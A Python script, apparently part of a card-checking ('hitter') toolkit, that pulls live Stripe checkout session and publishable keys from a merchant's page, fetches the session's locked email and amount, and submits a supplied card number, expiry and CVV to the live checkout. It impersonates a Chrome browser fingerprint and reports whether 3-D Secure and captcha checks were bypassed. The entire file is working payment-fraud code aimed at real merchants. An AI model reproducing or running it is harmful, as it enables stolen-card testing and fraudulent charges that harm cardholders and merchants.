"""Stripe test runner — extract cs/pk from URL, build hitter, hit."""
import asyncio, json, sys, os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from curl_compat import ChromeSession
from engines.stripe_hitter import StripeAPIHitter, StripeAPIExtractor

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def parse_card(spec: str) -> dict:
    parts = [p.strip() for p in spec.split('|')]
    return {"card": parts[0], "month": parts[1], "year": parts[2], "cvv": parts[3]}


async def main():
    if len(sys.argv) < 3:
        print("Usage: python stripe_runner.py <url> <cc|mm|yy|cvv>")
        return

    url = sys.argv[1]
    card = parse_card(sys.argv[2])

    # Step 1: fetch page, extract cs_live + pk_live + init_json
    async with ChromeSession(impersonate="chrome131", timeout=15) as sess:
        async with sess.get(url, headers={"User-Agent": UA, "Accept": "text/html,*/*"}) as r:
            html = r.text() if callable(r.text) else r.text

        cs_live = StripeAPIExtractor.extract_cs_live(url, html)
        if not cs_live:
            print("ERROR: couldn't extract cs_live from URL or page HTML")
            return

        pk_live = StripeAPIExtractor.extract_pk_live(html)

        # Hash is authoritative only when it carries a LIVE key
        hash_info = StripeAPIExtractor.extract_details_from_url_hash(url)
        hash_pk = hash_info.get('pk_key')
        stripe_account = hash_info.get('stripe_account')
        if hash_pk and hash_pk.startswith('pk_live_'):
            pk_live = hash_pk
        if not pk_live:
            print("ERROR: couldn't extract pk_live")
            return

        # Step 2: fetch init JSON
        init_json = {}
        if cs_live.startswith('cs_'):
            try:
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
                init_data = f"key={pk_live}&eid=NA&browser_locale=en-US"
                hdr = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
                async with sess.post(init_url, data=init_data, headers=hdr, timeout=8) as ir:
                    init_json = ir.json() if callable(ir.json) else ir.json
                    if not isinstance(init_json, dict):
                        init_json = {}
            except Exception:
                pass

        print(f"cs_live: {cs_live[:24]}...")
        print(f"pk_live: {pk_live[:24]}...")
        print(f"has init_json: {bool(init_json)}")

        locked_email = None
        if init_json:
            locked_email = (
                init_json.get('customer_email')
                or init_json.get('prefilled_email')
                or init_json.get('email')
                or (init_json.get('customer') or {}).get('email')
                or (init_json.get('customer_details') or {}).get('email')
            )
        if locked_email:
            print(f"locked_email: {locked_email}")

        ts = init_json.get('total_summary') if init_json else None
        raw_amount = ts.get('total') if isinstance(ts, dict) else None
        if raw_amount is None and init_json:
            raw_amount = (
                (init_json.get('invoice') or {}).get('amount_due')
                or (init_json.get('payment_intent') or {}).get('amount')
            )

    # Step 3: build hitter + hit
    striker = StripeAPIHitter(
        pk_live=pk_live,
        cs_live=cs_live,
        proxy_data=None,
        raw_amount=raw_amount,
        locked_email=locked_email,
        stripe_account=stripe_account,
        init_json=init_json,
    )

    try:
        result = await striker.hit(card, attempt=1, user_id=0)
    except Exception:
        import traceback
        traceback.print_exc()
        raise

    keep = {k: result.get(k) for k in (
        'success', 'decline_code', 'error', 'response_time', 'is_live',
        'amount', 'merchant', '3ds_bypassed', '3ds_type', '3ds_attempted',
        'captcha_bypassed')}
    keep['raw_resultCode'] = (result.get('raw_response') or {}).get('status')
    print("\n=== RESULT ===")
    print(json.dumps(keep, indent=2))


if __name__ == '__main__':
    asyncio.run(main())